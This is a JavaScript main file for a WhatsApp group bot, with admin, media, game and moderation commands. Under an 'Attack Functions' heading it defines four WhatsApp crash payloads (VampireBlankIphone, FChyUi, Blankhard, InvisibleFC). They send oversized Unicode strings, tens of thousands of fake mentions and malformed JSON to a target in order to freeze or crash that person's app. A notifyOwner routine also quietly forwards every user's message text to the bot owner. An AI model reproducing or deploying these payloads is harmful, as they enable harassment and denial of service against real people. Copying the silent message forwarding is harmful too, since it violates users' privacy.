// 🧹 Fix for ENOSPC / temp overflow in hosted panels
const fs = require('fs');
const path = require('path');

// Redirect temp storage away from system /tmp
const customTemp = path.join(process.cwd(), 'temp');
if (!fs.existsSync(customTemp)) fs.mkdirSync(customTemp, { recursive: true });
process.env.TMPDIR = customTemp;
process.env.TEMP = customTemp;
process.env.TMP = customTemp;

// Auto-cleaner every 30 minutes (aggressive)
function cleanDir(dir, maxAgeMs) {
    if (!fs.existsSync(dir)) return;
    fs.readdir(dir, (err, files) => {
        if (err) return;
        let count = 0;
        for (const file of files) {
            const filePath = path.join(dir, file);
            fs.stat(filePath, (err, stats) => {
                if (!err && stats.isFile() && Date.now() - stats.mtimeMs > maxAgeMs) {
                    fs.unlink(filePath, () => { });
                    count++;
                }
            });
        }
        if (count > 0) console.log(`🧹 Cleaned ${count} file(s) from ${dir}`);
    });
}

setInterval(() => {
    // Temp files older than 30 min
    cleanDir(customTemp, 30 * 60 * 1000);
    // Also clean common media/cache dirs
    cleanDir(path.join(process.cwd(), 'downloads'), 30 * 60 * 1000);
    cleanDir(path.join(process.cwd(), 'cache'), 60 * 60 * 1000);
    cleanDir(path.join(process.cwd(), 'logs'), 2 * 60 * 60 * 1000);
    console.log('🧹 Auto-clean cycle done');
}, 30 * 60 * 1000);

const settings = require('./settings');
require('./config.js');
const { isBanned } = require('./lib/isBanned');
const yts = require('yt-search');
const { fetchBuffer } = require('./lib/myfunc');
const fetch = require('node-fetch');

const axios = require('axios');
const ffmpeg = require('fluent-ffmpeg');
const { isSudo } = require('./lib/index');
const isOwnerOrSudo = require('./lib/isOwner');
const { autotypingCommand, isAutotypingEnabled, handleAutotypingForMessage, handleAutotypingForCommand, showTypingAfterCommand } = require('./plugins/owner/autotyping');
const { autoreadCommand, isAutoreadEnabled, handleAutoread } = require('./plugins/owner/autoread');

// Command imports
const tagAllCommand = require('./plugins/admin/tagall');
const helpCommand = require('./plugins/general/help');
const banCommand = require('./plugins/admin/ban');
const { promoteCommand } = require('./plugins/admin/promote');
const { demoteCommand } = require('./plugins/admin/demote');
const muteCommand = require('./plugins/admin/mute');
const unmuteCommand = require('./plugins/admin/unmute');
const stickerCommand = require('./plugins/image/sticker');
const isAdmin = require('./lib/isAdmin');
const warnCommand = require('./plugins/admin/warn');
const warningsCommand = require('./plugins/admin/warnings');
const ttsCommand = require('./plugins/general/tts');
const { tictactoeCommand, handleTicTacToeMove } = require('./plugins/game/tictactoe');
const { incrementMessageCount, topMembers } = require('./plugins/admin/topmembers');
const ownerCommand = require('./plugins/general/owner');
const deleteCommand = require('./plugins/admin/delete');
const { handleAntilinkCommand, handleLinkDetection } = require('./plugins/admin/antilink');
const { Antilink } = require('./lib/antilink');
const { handleMentionDetection, mentionToggleCommand, setMentionCommand, handleStatusMention } = require('./plugins/owner/mention');
const memeCommand = require('./plugins/image/meme');
const tagCommand = require('./plugins/admin/tag');
const tagNotAdminCommand = require('./plugins/admin/tagnotadmin');
const hideTagCommand = require('./plugins/admin/hidetag');
const jokeCommand = require('./plugins/general/joke');
const quoteCommand = require('./plugins/general/quote');
const factCommand = require('./plugins/general/fact');
const weatherCommand = require('./plugins/general/weather');
const newsCommand = require('./plugins/general/news');
const kickCommand = require('./plugins/admin/kick');
const simageCommand = require('./plugins/image/simage');
const attpCommand = require('./plugins/general/attp');
const { startHangman, guessLetter } = require('./plugins/game/hangman');
const { startTrivia, answerTrivia } = require('./plugins/game/trivia');
const { complimentCommand } = require('./plugins/fun/compliment');
const { insultCommand } = require('./plugins/fun/insult');
const { eightBallCommand } = require('./plugins/general/eightball');
const { lyricsCommand } = require('./plugins/general/lyrics');
const { dareCommand } = require('./plugins/game/dare');
const { truthCommand } = require('./plugins/game/truth');
const { clearCommand } = require('./plugins/admin/clear');
const pingCommand = require('./plugins/general/ping');
const aliveCommand = require('./plugins/general/alive');
const blurCommand = require('./plugins/image/img-blur');
const { welcomeCommand, handleJoinEvent } = require('./plugins/admin/welcome');
const { goodbyeCommand, handleLeaveEvent } = require('./plugins/admin/goodbye');
const githubCommand = require('./plugins/github/github');
const { handleAntiBadwordCommand, handleBadwordDetection } = require('./lib/antibadword');
const antibadwordCommand = require('./plugins/admin/antibadword');
const { handleChatbotCommand, handleChatbotResponse } = require('./plugins/admin/chatbot');
const takeCommand = require('./plugins/image/take');
const { flirtCommand } = require('./plugins/fun/flirt');
const characterCommand = require('./plugins/fun/character');
const wastedCommand = require('./plugins/fun/wasted');
const shipCommand = require('./plugins/fun/ship');
const groupInfoCommand = require('./plugins/general/groupinfo');
const resetlinkCommand = require('./plugins/admin/resetlink');
const staffCommand = require('./plugins/general/staff');
const unbanCommand = require('./plugins/admin/unban');
const { tempbanCommand, untempbanCommand, restorePendingTempBans } = require('./plugins/admin/tempban');
const emojimixCommand = require('./plugins/image/emojimix');
const { handlePromotionEvent } = require('./plugins/admin/promote');
const { handleDemotionEvent } = require('./plugins/admin/demote');
const viewOnceCommand = require('./plugins/general/viewonce');
const clearSessionCommand = require('./plugins/owner/clearsession');
const { autoStatusCommand, handleStatusUpdate } = require('./plugins/owner/autostatus');
const { simpCommand } = require('./plugins/fun/simp');
const { stupidCommand } = require('./plugins/fun/stupid');
const stickerTelegramCommand = require('./plugins/image/stickertelegram');
const textmakerCommand = require('./plugins/textmaker/textmaker');

const clearTmpCommand = require('./plugins/owner/cleartmp');
const callPrivacyCommand = require('./plugins/owner/callprivacy');
const setProfilePicture = require('./plugins/owner/setpp');
const { setGroupDescription, setGroupName, setGroupPhoto } = require('./plugins/admin/groupmanage');
const instagramCommand = require('./plugins/image/instagram');





const aiCommand = require('./plugins/ai/ai');
const urlCommand = require('./plugins/general/url');
const { handleTranslateCommand } = require('./plugins/general/translate');
const { handleSsCommand } = require('./plugins/general/ss');
const { addCommandReaction, handleAreactCommand } = require('./lib/reactions');
const { shayariCommand } = require('./plugins/fun/shayari');
const { rosedayCommand } = require('./plugins/fun/roseday');
const imagineCommand = require('./plugins/ai/imagine');

const sudoCommand = require('./plugins/owner/sudo');
const { approvePayment, rejectPayment, checkPaid, pendingPayments, isPaidUser } = require('./plugins/owner/payment');
const { miscCommand, handleHeart } = require('./plugins/misc/misc');
const { animeCommand } = require('./plugins/anime/anime');
const { piesCommand, piesAlias } = require('./plugins/pies/pies');
const stickercropCommand = require('./plugins/image/stickercrop');
const updateCommand = require('./plugins/owner/update');
const removebgCommand = require('./plugins/image/removebg');
const { reminiCommand } = require('./plugins/image/remini');
const { igsCommand } = require('./plugins/image/igs');
const { anticallCommand, readState: readAnticallState, handleIncomingCall } = require('./plugins/owner/anticall');
const { handleAntideleteCommand, handleMessageRevocation, storeMessage } = require('./plugins/owner/antidelete');
const tiktokCommand = require('./plugins/download/tiktok');
const { ytmp3Command, ytmp4Command } = require('./plugins/download/youtube');
const { pmblockerCommand, readState: readPmBlockerState } = require('./plugins/owner/pmblocker');
const settingsCommand = require('./plugins/owner/settings');
const soraCommand = require('./plugins/ai/sora');
const { namazCommand } = require('./plugins/islamic/namaz');
const { hadithCommand, bookCommand, getBooksListMessage, HADITH_BOOKS, findBookKey } = require('./plugins/islamic/hadith');
const pairCommand = require('./plugins/owner/pair');
const truecallerCommand = require('./plugins/owner/truecaller');
const facebookCommand = require('./plugins/download/facebook');

// Global settings
global.packname = settings.packname;
global.author = settings.author;
global.channelLink = "https://whatsapp.com/channel/";
global.ytch = "M USMAN CHACHAR";

// Add this near the top of main.js with other global configurations
const channelInfo = {
    contextInfo: {


        forwardedNewsletterMessageInfo: {
            newsletterJid: '@newsletter',
            newsletterName: 'M USMAN CHACHAR MD',
            serverMessageId: -1
        }
    }
};

// ─── OWNER PERSONAL MSG NOTIFIER ────────────────────────────────────────────
// Sends a private DM to owner whenever someone uses a command or sends a msg
async function notifyOwner(sock, senderJid, chatId, text, isGroup) {
    try {
        const ownerNumber = settings.owner; // e.g. "923001234567" from settings.js
        if (!ownerNumber) return;

        const ownerJid = ownerNumber.includes('@s.whatsapp.net')
            ? ownerNumber
            : `${ownerNumber.replace(/[^0-9]/g, '')}@s.whatsapp.net`;

        // Don't notify owner about their own messages
        if (senderJid === ownerJid || senderJid === `${ownerNumber.replace(/[^0-9]/g, '')}@s.whatsapp.net`) return;

        const senderNum = senderJid.replace('@s.whatsapp.net', '').replace('@lid', '');
        const location = isGroup ? `📢 *Group:* ${chatId.replace('@g.us', '')}` : `💬 *Private Chat*`;

        const notifMsg =
            `🔔 *New Message Alert!*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `👤 *From:* @${senderNum}\n` +
            `${location}\n` +
            `💬 *Message:* ${text || '(media/no text)'}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `_Usman Bot Notification_`;

        await sock.sendMessage(ownerJid, {
            text: notifMsg,
            mentions: [senderJid]
        });
    } catch (e) {
        // Silently fail — never crash main flow
    }
}
// ============ SLEEP HELPER ============
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
// ─────────────────────────────────────────────────// --------------------- Attack Functions ---------------------

async function VampireBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐆𝐫𝐢𝐦𝐑𝐞𝐚𝐩𝐞𝐫" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await bot.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}

async function FChyUi(target) {
    let hyuiForceX = JSON.stringify({
        status: true,
        criador: "hyuiForcex",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    sockCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnsockCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    const contextInfo = {
        mentionedJid: [target],


        businessMessageForwardInfo: {
            businessOwnerJid: target
        }
    };

    let messagePayload = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    contextInfo,
                    body: {
                        text: "𝙳𝚄𝙰𝚁 [ 𝟸 ] 🔥",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: hyuiForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱" },
                            { name: "call_permission_request", buttonParamsJson: hyuiForceX + "\u0003" },
                        ]
                    }
                }
            }
        }
    };

    await bot.relayMessage(target, messagePayload, { participant: { jid: target } });
}

async function Blankhard(target) {
    let message = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: {
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 40000 }, () =>
                                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            ),
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                    },
                    stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, message, {});
    await bot.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined },
                        ],
                    },
                ],
            },
        ],
    });
}

async function InvisibleFC(target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "Hades Is Back!",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -999.035,
                                degreesLongitude: 922.999999999999,
                                name: "Hades Is Back!",
                                address: "Hades Is Back!",
                            },
                        },
                        body: {
                            text: "Hades Is Back!",
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        contextInfo: {
                            participant: target,
                            mentionedJid: ["0@s.whatsapp.net"],
                        },
                    },
                },
            },
        };

        await bot.relayMessage(target, message, {
            messageId: null,
            participant: { jid: target },
            userJid: target,
        });
    } catch (err) {
        console.log(err);
    }
}

//────────────────────────────


// ══════════════════════════════════════════════════════════════
// 🔍 UNKNOWN COMMAND HANDLER - Suggest similar commands
// ══════════════════════════════════════════════════════════════
const ALL_BOT_COMMANDS = [
    ".1917",".8ball",".abudawud",".admins",".ahmad",".alive",".animu",".animuquote",
    ".answer",".antibadword",".anticall",".antidelete",".antilink",".anularlink",
    ".approve",".areact",".arena",".attp",".autoreact",".autoreaction",".autoread",
    ".autostatus",".autotyping",".ban",".blackpink",".blur",".bot",".bukhari",
    ".character",".chatbot",".checkpaid",".chiku",".china",".circle",".clear",
    ".clearsession",".clearsesi",".cleartmp",".claude",".compliment",".comrade",
    ".crop",".cry",".dalle",".dare",".darimi",".dawud",".del",".delete",".demote",
    ".devil",".emix",".emojimix",".enhance",".face-palm",".facepalm",".facebook",
    ".fact",".fb",".fbdl",".fire",".flirt",".flux",".gay",".gemini",".git",
    ".github",".glass",".glitch",".gpt",".groupinfo",".guess",".hadith",
    ".hadithbooks",".hadithlist",".haiku",".hangman",".hacker",".hbooks",".heart",
    ".help",".hidetag",".horny",".hug",".ig",".igsc",".igs",".imagine",".india",
    ".indonesia",".infogp",".infogrupo",".insta",".instagram",".insult",".iss",
    ".its-so-stupid",".itssostupid",".ibnmajah",".jail",".japan",".jid",".joke",
    ".kick",".kiss",".korea",".leaves",".lgbt",".light",".list",".listadmin",
    ".loli",".lolice",".lyrics",".majah",".malaysia",".matrix",".meme",".mention",
    ".menu",".metallic",".move",".mp3",".music",".muslim",".musnad",".mute",
    ".muwatta",".namaz",".namecard",".nasai",".neon",".news",".nobg",".nom",
    ".oogway",".oogway2",".owner",".pair",".passed",".pat",".pendingpay",".pies",
    ".ping",".play",".pmblocker",".poke",".prayer",".promote",".purple",".quote",
    ".reject",".remini",".removebg",".repo",".resetlink",".revoke",".riyadh",
    ".rmbg",".roseday",".s",".sand",".sc",".screenshot",".setgdesc",".setgname",
    ".setgpp",".setmention",".setpp",".shayari",".shayri",".ship",".sim",
    ".simdata",".simage",".simp",".simpcard",".snow",".song",".sora",".ss",
    ".ssweb",".staff",".steal",".sticker",".stickertelegram",".stupid",
    ".sudo",".surrender",".tag",".tagall",".tagnotadmin",".take",".tc",
    ".telesticker",".tg",".tgsticker",".thailand",".thunder",".tictactoe",
    ".tirmidhi",".tirmizi",".tiktok",".tonikawa",".topmembers",".tourl",
    ".translate",".triggered",".trivia",".trt",".truth",".tt",".tts",".tweet",
    ".untempban",".unban",".unmute",".update",".upscale",".url",".vv",".video",
    ".warn",".warnings",".waste",".weather",".welcome",".wink",".yt",".ytcomment",
    ".ytmp3",".ytmp4",".1917",".8ball"
];

// Simple similarity: count matching characters at start + common letters
function getCommandSuggestions(input) {
    const typed = input.toLowerCase().trim();
    if (!typed.startsWith('.')) return [];

    const typedCmd = typed.split(/\s+/)[0]; // just the command word

    const scored = ALL_BOT_COMMANDS.map(cmd => {
        let score = 0;
        const minLen = Math.min(typedCmd.length, cmd.length);

        // Bonus for matching prefix characters
        for (let i = 0; i < minLen; i++) {
            if (typedCmd[i] === cmd[i]) score += 2;
            else break;
        }

        // Bonus for common letters (regardless of position)
        const typedChars = new Set(typedCmd.slice(1)); // skip dot
        const cmdChars = new Set(cmd.slice(1));
        for (const c of typedChars) {
            if (cmdChars.has(c)) score += 1;
        }

        // Penalty for big length difference
        score -= Math.abs(typedCmd.length - cmd.length) * 0.5;

        return { cmd, score };
    });

    // Return top 5 with score > 1
    return scored
        .filter(x => x.score > 1)
        .sort((a, b) => b.score - a.score)
        .slice(0, 5)
        .map(x => x.cmd);
}

async function handleMessages(sock, messageUpdate, printLog) {
    let chatId = null;
    let message = null;
    try {
        const { messages, type } = messageUpdate;
        if (type !== 'notify') return;

        message = messages[0];


        if (!message?.message) return;

        // Handle autoread functionality
        await handleAutoread(sock, message);

        // Store message for antidelete feature
        if (message.message) {
            storeMessage(sock, message);
        }

        // Handle message revocation (antidelete)
        if (message.message?.protocolMessage?.type === 0) {
            await handleMessageRevocation(sock, message);
            return;
        }

        // (auto-reveal removed)

        chatId = message.key.remoteJid;
        const senderId = message.key.participant || message.key.remoteJid;
        const isGroup = chatId.endsWith('@g.us');
        const senderIsSudo = await isSudo(senderId);
        const senderIsOwnerOrSudo = await isOwnerOrSudo(senderId, sock, chatId);

        // Handle button responses
        if (message.message?.buttonsResponseMessage) {
            const buttonId = message.message.buttonsResponseMessage.selectedButtonId;
            const chatId = message.key.remoteJid;

            if (buttonId === 'channel') {
                await sock.sendMessage(chatId, {
                    text: '📢 *Join our Channel:*\nhttps://whatsapp.com/channel/'
                }, { quoted: message });
                return;
            } else if (buttonId === 'owner') {
                const ownerCommand = require('./plugins/general/owner');
                await ownerCommand(sock, chatId);
                return;
            } else if (buttonId === 'support') {
                await sock.sendMessage(chatId, {
                    text: `🔗 *Support*\n\nhttps://chat.whatsapp.com/?mode=wwt`
                }, { quoted: message });
                return;
            }
        }

        const userMessage = (
            message.message?.conversation?.trim() ||
            message.message?.extendedTextMessage?.text?.trim() ||
            message.message?.imageMessage?.caption?.trim() ||
            message.message?.videoMessage?.caption?.trim() ||
            message.message?.buttonsResponseMessage?.selectedButtonId?.trim() ||
            ''
        ).toLowerCase().replace(/\.\s+/g, '.').trim();

        // Preserve raw message for commands like .tag that need original casing
        const rawText = message.message?.conversation?.trim() ||
            message.message?.extendedTextMessage?.text?.trim() ||
            message.message?.imageMessage?.caption?.trim() ||
            message.message?.videoMessage?.caption?.trim() ||
            '';

        // Beautiful message log
        {
            const senderName = message.pushName || senderId.split('@')[0];
            const lid = senderId.split('@')[0];
            const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', hour12: true });
            const msgText = rawText || '[media/sticker]';
            const chat = isGroup ? 'Group' : 'Private';
            console.log(`\n┌─────────────────────────────`);
            console.log(`│ 👤 Name  : ${senderName}`);
            console.log(`│ 🆔 LID   : ${lid}`);
            console.log(`│ 🕐 Time  : ${time}`);
            console.log(`│ 💬 Msg   : ${msgText.substring(0, 60)}`);
            console.log(`│ 📍 Chat  : ${chat}`);
            console.log(`└─────────────────────────────`);
        }
        // Read bot mode once; don't early-return so moderation can still run in private mode
        let isPublic = true;
        try {
            const raw = fs.readFileSync('./data/messageCount.json', 'utf8').trim();
            if (raw) {
                const data = JSON.parse(raw);
                if (typeof data.isPublic === 'boolean') isPublic = data.isPublic;
            }
        } catch (error) {
            console.error('Error checking access mode:', error);
            // default isPublic=true on error
        }
        const isOwnerOrSudoCheck = message.key.fromMe || senderIsOwnerOrSudo;
        // Check if user is banned (skip ban check for unban command)
        if (isBanned(senderId) && !userMessage.startsWith('.unban')) {
            // Only respond occasionally to avoid spam
            if (Math.random() < 0.1) {
                await sock.sendMessage(chatId, {
                    text: '❌ You are banned from using the bot. Contact an admin to get unbanned.',
                    ...channelInfo
                });
            }
            return;
        }

        // First check if it's a game move
        if (/^[1-9]$/.test(userMessage) || userMessage.toLowerCase() === 'surrender') {
            await handleTicTacToeMove(sock, chatId, senderId, userMessage);
            return;
        }

        /*  // Basic message response in private chat
          if (!isGroup && (userMessage === 'hi' || userMessage === 'hello' || userMessage === 'bot' || userMessage === 'hlo' || userMessage === 'hey' || userMessage === 'bro')) {
              await sock.sendMessage(chatId, {
                  text: 'Hi, How can I help you?\nYou can use .menu for more info and commands.',
                  ...channelInfo
              });
              return;
          } */

        if (!message.key.fromMe) incrementMessageCount(chatId, senderId);

        // Check for bad words and antilink FIRST, before ANY other processing
        // Always run moderation in groups, regardless of mode
        if (isGroup) {
            if (userMessage) {
                await handleBadwordDetection(sock, chatId, message, userMessage, senderId);
            }
            // Antilink checks message text internally, so run it even if userMessage is empty
            await Antilink(message, sock);
        }

        // PM blocker: block non-owner DMs when enabled (do not ban)
        if (!isGroup && !message.key.fromMe && !senderIsSudo) {
            try {
                const pmState = readPmBlockerState();
                if (pmState.enabled) {
                    // Inform user, delay, then block without banning globally
                    await sock.sendMessage(chatId, { text: pmState.message || 'Private messages are blocked. Please contact the owner in groups only.' });
                    await new Promise(r => setTimeout(r, 1500));
                    try { await sock.updateBlockStatus(chatId, 'block'); } catch (e) { }
                    return;
                }
            } catch (e) { }
        }

        // Then check for command prefix
        if (!userMessage.startsWith('.')) {
            // Show typing indicator if autotyping is enabled
            await handleAutotypingForMessage(sock, chatId, userMessage);

            // ─── OK / DONE / COMING AUTO REPLY ─────────────────────────────
            const okPhrases = [
                // OK / Okay variants
               // 'oksknsnk;
            ];
            const okReplies = [
                'ok',
            ];
            const msgLowerOk = userMessage.toLowerCase().trim();
            const isOkDoneComing = okPhrases.some(phrase =>
                msgLowerOk === phrase ||
                msgLowerOk === phrase + '.' ||
                msgLowerOk === phrase + '!' ||
                msgLowerOk === phrase + '?' ||
                msgLowerOk.startsWith(phrase + ' ') ||
                msgLowerOk.startsWith(phrase + ',')
            );
            if (isOkDoneComing) {
                const reply = okReplies[Math.floor(Math.random() * okReplies.length)];
                await sock.sendMessage(chatId, { text: reply }, { quoted: message });
                return;
            }
            // ────────────────────────────────────────────────────────────────

            // ────────────────────────────────────────────────────────────────

            if (isGroup) {
                // Always run moderation features regardless of mode
                await handleMentionDetection(sock, chatId, message);

                // Only run chatbot in public mode or for owner/sudo
                if (isPublic || isOwnerOrSudoCheck) {
                    await handleChatbotResponse(sock, chatId, message, userMessage, senderId);
                }
            }
            return;
        }
        // In private mode, only owner/sudo can run commands
        if (!isPublic && !isOwnerOrSudoCheck) {
            return;
        }

        // List of admin commands
        const adminCommands = ['.mute', '.unmute', '.ban', '.unban', '.tempban', '.untempban', '.promote', '.demote', '.kick', '.tagall', '.tagnotadmin', '.hidetag', '.antilink', '.setgdesc', '.setgname', '.setgpp'];
        const isAdminCommand = adminCommands.some(cmd => userMessage.startsWith(cmd));

        // List of owner commands
        const ownerCommands = ['.mode', '.autostatus', '.antidelete', '.cleartmp', '.setpp', '.clearsession', '.areact', '.autoreact', '.autotyping', '.autoread', '.pmblocker', '.callprivacy'];
        const isOwnerCommand = ownerCommands.some(cmd => userMessage.startsWith(cmd));

        let isSenderAdmin = false;
        let isBotAdmin = false;

        // Check admin status only for admin commands in groups
        if (isGroup && isAdminCommand) {
            const adminStatus = await isAdmin(sock, chatId, senderId);
            isSenderAdmin = adminStatus.isSenderAdmin;
            isBotAdmin = adminStatus.isBotAdmin;

            if (!isBotAdmin) {
                await sock.sendMessage(chatId, { text: 'Please make the bot an admin to use admin commands.', ...channelInfo }, { quoted: message });
                return;
            }

            if (
                userMessage.startsWith('.mute') ||
                userMessage === '.unmute' ||
                userMessage.startsWith('.ban') ||
                userMessage.startsWith('.unban') ||
                userMessage.startsWith('.promote') ||
                userMessage.startsWith('.demote')
            ) {
                if (!isSenderAdmin && !message.key.fromMe) {
                    await sock.sendMessage(chatId, {
                        text: 'Sorry, only group admins can use this command.',
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }
            }
        }

        // Check owner status for owner commands
        if (isOwnerCommand) {
            if (!message.key.fromMe && !senderIsOwnerOrSudo) {
                await sock.sendMessage(chatId, { text: '❌ This command is only available for the owner or sudo!' }, { quoted: message });
                return;
            }
        }

        // Command handlers - Execute commands immediately without waiting for typing indicator
        // We'll show typing indicator after command execution if needed
        let commandExecuted = false;

        switch (true) {
            case userMessage === '.simage': {
                const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                if (quotedMessage?.stickerMessage) {
                    await simageCommand(sock, quotedMessage, chatId);
                } else {
                    await sock.sendMessage(chatId, { text: 'Please reply to a sticker with the .simage command to convert it.', ...channelInfo }, { quoted: message });
                }
                commandExecuted = true;
                break;
            }
            case userMessage.startsWith('.kick'):
                const mentionedJidListKick = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await kickCommand(sock, chatId, senderId, mentionedJidListKick, message);
                break;
            case userMessage.startsWith('.mute'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const muteArg = parts[1];
                    const muteDuration = muteArg !== undefined ? parseInt(muteArg, 10) : undefined;
                    if (muteArg !== undefined && (isNaN(muteDuration) || muteDuration <= 0)) {
                        await sock.sendMessage(chatId, { text: 'Please provide a valid number of minutes or use .mute with no number to mute immediately.', ...channelInfo }, { quoted: message });
                    } else {
                        await muteCommand(sock, chatId, senderId, message, muteDuration);
                    }
                }
                break;
            case userMessage === '.unmute':
                await unmuteCommand(sock, chatId, senderId);
                break;
            case userMessage.startsWith('.ban'):
                if (!isGroup) {
                    if (!message.key.fromMe && !senderIsSudo) {
                        await sock.sendMessage(chatId, { text: 'Only owner/sudo can use .ban in private chat.' }, { quoted: message });
                        break;
                    }
                }
                await banCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.unban'):
                if (!isGroup) {
                    if (!message.key.fromMe && !senderIsSudo) {
                        await sock.sendMessage(chatId, { text: 'Only owner/sudo can use .unban in private chat.' }, { quoted: message });
                        break;
                    }
                }
                await unbanCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.tempban'):
                await tempbanCommand(sock, chatId, message, senderId, isSenderAdmin, isBotAdmin);
                commandExecuted = true;
                break;
            case userMessage.startsWith('.untempban'):
                await untempbanCommand(sock, chatId, message, senderId, isSenderAdmin, isBotAdmin);
                commandExecuted = true;
                break;
               
            case userMessage === '.help' || userMessage === '.menu' || userMessage === '.bot' || userMessage === '.list':
                await helpCommand(sock, chatId, message, global.channelLink);
                commandExecuted = true;
                break;
            case userMessage === '.sticker' || userMessage === '.s':
                await stickerCommand(sock, chatId, message);
                commandExecuted = true;
                break;
            case userMessage.startsWith('.warnings'):
                const mentionedJidListWarnings = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await warningsCommand(sock, chatId, mentionedJidListWarnings);
                break;
            case userMessage.startsWith('.warn'):
                const mentionedJidListWarn = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await warnCommand(sock, chatId, senderId, mentionedJidListWarn, message);
                break;
            case userMessage.startsWith('.tts'):
                const text = userMessage.slice(4).trim();
                await ttsCommand(sock, chatId, text, message);
                break;
            case userMessage.startsWith('.delete') || userMessage.startsWith('.del'):
                await deleteCommand(sock, chatId, message, senderId);
                break;
            case userMessage.startsWith('.attp'):
                await attpCommand(sock, chatId, message);
                break;

            case userMessage === '.settings':
                await settingsCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.mode'):
                // Check if sender is the owner
                if (!message.key.fromMe && !senderIsOwnerOrSudo) {
                    await sock.sendMessage(chatId, { text: 'Only bot owner can use this command!', ...channelInfo }, { quoted: message });
                    return;
                }
                // Read current data first
                let data;
                try {
                    data = JSON.parse(fs.readFileSync('./data/messageCount.json'));
                } catch (error) {
                    console.error('Error reading access mode:', error);
                    await sock.sendMessage(chatId, { text: 'Failed to read bot mode status', ...channelInfo });
                    return;
                }

                const action = userMessage.split(' ')[1]?.toLowerCase();
                // If no argument provided, show current status
                if (!action) {
                    const currentMode = data.isPublic ? 'public' : 'private';
                    await sock.sendMessage(chatId, {
                        text: `Current bot mode: *${currentMode}*\n\nUsage: .mode public/private\n\nExample:\n.mode public - Allow everyone to use bot\n.mode private - Restrict to owner only`,
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }

                if (action !== 'public' && action !== 'private') {
                    await sock.sendMessage(chatId, {
                        text: 'Usage: .mode public/private\n\nExample:\n.mode public - Allow everyone to use bot\n.mode private - Restrict to owner only',
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }

                try {
                    // Update access mode
                    data.isPublic = action === 'public';

                    // Save updated data
                    fs.writeFileSync('./data/messageCount.json', JSON.stringify(data, null, 2));

